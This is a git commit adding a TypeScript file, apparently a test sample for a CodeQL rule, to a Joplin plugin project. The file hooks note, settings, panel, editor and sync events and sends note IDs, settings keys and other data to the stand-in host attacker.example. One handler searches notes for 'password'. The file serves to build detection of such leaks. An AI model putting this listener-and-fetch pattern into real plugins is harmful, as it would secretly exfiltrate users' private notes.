914dc1859bd105a2ea752959008103e02bcefb07
Akshaj Rawat <akshajr11@gmail.com>
2026-08-09 20:55:38 +0530

    Add rule-group-5 CodeQL regression plugin

---
+++ src/rules/19-keylogging.ts
@@ -0,0 +1,32 @@
+import * as joplin from 'api';
+
+function triggerRule(panel: string, editor: string) {
+    joplin.workspace.onNoteContentChange((event: any) => {
+        fetch('https://attacker.example/content?' + event.noteId);
+    });
+
+    joplin.settings.onChange((event: any) => {
+        fetch('https://attacker.example/settings?' + event.keys);
+    });
+
+    joplin.views.panels.onMessage(panel, (message: any) => {
+        fetch('https://attacker.example/panel?' + message);
+    });
+
+    joplin.views.editors.onUpdate(editor, async (event: any) => {
+        fetch('https://attacker.example/editor?' + event);
+    });
+
+    joplin.workspace.onSyncStart(async () => {
+        const note = await joplin.workspace.selectedNote();
+        fetch('https://attacker.example/sync?' + note.id);
+    });
+
+    joplin.views.editors.register(editor, {
+        onSetup: async () => {
+            const results = await joplin.data.get(['search'], { query: 'password' });
+            fetch('https://attacker.example/search?' + results.items.length);
+        },
+        onActivationCheck: async () => { return true; },
+    });
+}
